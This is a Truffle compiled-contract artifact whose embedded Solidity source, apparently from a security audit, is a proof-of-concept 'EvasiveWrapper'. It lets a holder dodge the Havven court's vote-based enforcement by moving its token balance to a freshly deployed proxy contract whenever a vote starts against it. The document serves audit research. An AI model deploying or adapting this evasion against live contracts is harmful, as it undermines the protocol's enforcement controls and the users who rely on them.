{
  "contractName": "SlimCourt",
  "abi": [
    {
      "constant": true,
      "inputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "name": "voteStartTimes",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    }
  ],
  "bytecode": "0x6060604052341561000f57600080fd5b60d28061001d6000396000f300606060405260043610603f576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063e8ee6b41146044575b600080fd5b3415604e57600080fd5b6078600480803573ffffffffffffffffffffffffffffffffffffffff16906020019091905050608e565b6040518082815260200191505060405180910390f35b600060205280600052604060002060009150905054815600a165627a7a723058201c58c3b497fc2edc4047935ac004d726377632cc06a634d39c9f25875d75efae0029",
  "source": "/*\n * EvasiveWrapper.sol\n *\n * This is a proof-of concept contract to demonstrate a \n * method for avoiding the Havven court contract.\n *\n * This contract is not production-ready and should not be used\n * to store any value. The authors do not condone the use of this\n * contract. This contract exists only for research purposes.\n */\npragma solidity ^0.4.19;\n\ncontract SlimCourt {\n    mapping(address => uint) public voteStartTimes;\n}\n\ncontract SlimEtherNomin {\n    SlimCourt public court;\n    function balanceOf(address who) public view returns (uint256);\n    function transfer(address to, uint256 value) public returns (bool);\n}\n\ncontract Pawn {\n\taddress public owner;\n\tSlimEtherNomin public target;\n\n\tfunction Pawn(address _target) public {\n\t\towner = msg.sender;\n\t\ttarget = SlimEtherNomin(_target);\n\t}\n\t\n\tfunction() public {\n\t\trequire(msg.sender == owner);\n\t\ttarget.call(msg.data);\n    }\n}\n\ncontract EvasiveWrapper {\n\tSlimEtherNomin public nomin;\n\taddress public pawn;\n\n\tfunction EvasiveWrapper(address _nomin) public {\n\t\tnomin = SlimEtherNomin(_nomin);\n\t\tpawn = new Pawn(nomin);\n\t}\n\n\tfunction evade() public {\n\t\tSlimCourt court = nomin.court();\n\t\tif(court.voteStartTimes(this) > 0)  {\n\t\t\tnewPawn();\n\t\t}\n\t}\n\n\tfunction newPawn() internal {\n\t\tSlimEtherNomin oldPawn = SlimEtherNomin(pawn);\n\t\tpawn = new Pawn(nomin);\n\t\tuint balanceToMigrate = nomin.balanceOf(oldPawn);\n\t\tif(balanceToMigrate > 0) {\n\t\t    oldPawn.transfer(pawn, balanceToMigrate);\n\t\t}\n\t}\n}\n",
  "sourcePath": "/home/paul/Dropbox/Personal/pcs/miniparch/development/havven/audit/truffle/contracts/EvasiveWrapper.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.19+commit.c4cbbb05.Emscripten.clang"
  },
  "schemaVersion": "1.0.1",
  "updatedAt": "2018-02-22T00:30:58.006Z"
}